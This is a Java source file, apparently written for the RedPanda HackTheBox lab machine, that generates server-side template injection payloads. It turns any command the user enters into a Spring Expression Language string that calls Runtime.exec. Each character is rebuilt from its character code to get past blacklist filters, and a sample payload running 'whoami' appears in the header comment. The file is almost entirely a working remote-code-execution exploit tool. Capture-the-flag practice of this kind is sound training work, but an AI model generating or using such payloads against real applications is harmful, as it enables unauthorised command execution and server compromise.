
/**
 * @Lostruth 
 * @v.001
 * SSTI playload generator. 
 * Coded for RedPanda HTB machine
 *
 *
 * Example of payload:
 * * {T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
 * This payload executes the command whoami
**/
import java.io.IOException;
import java.util.*;
import java.util.Scanner;

public class RedPanda {
    
    public static String Payload(String str) {
    
        int[] result = new int[str.length()];
        String payload="";
    
        for (int i = 0; i < str.length(); i++) {
        
            result[i] = (int)str.charAt(i);
        
        
            if (i == 0){
                payload="*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString("+result[i]+")";
            }
        
            if (i == (str.length()-1)){
                payload=payload.concat(".concat(T(java.lang.Character).toString("+result[i]+"))).getInputStream())}");
            }
        
            if ((i != 0)&&(i != (str.length()-1))){
                payload=payload.concat(".concat(T(java.lang.Character).toString("+result[i]+"))");
            }
        }
    
        return payload;
    
    }
 
     public static void Banner(){
         System.out.println("------------------------------------------------------------");
         System.out.println("                 STTI PAYLOAD GENERATOR                     ");
         System.out.println("------------------------------------------------------------");
         System.out.println();
         System.out.println();
    }

        
    public static void main(String[] args) throws IOException, InterruptedException {
        Banner();
        Scanner input = new Scanner (System.in);
        System.out.println("Enter the command to generate payload:");
        String name = input.next();
        System.out.println(Payload(name));
        
    }
}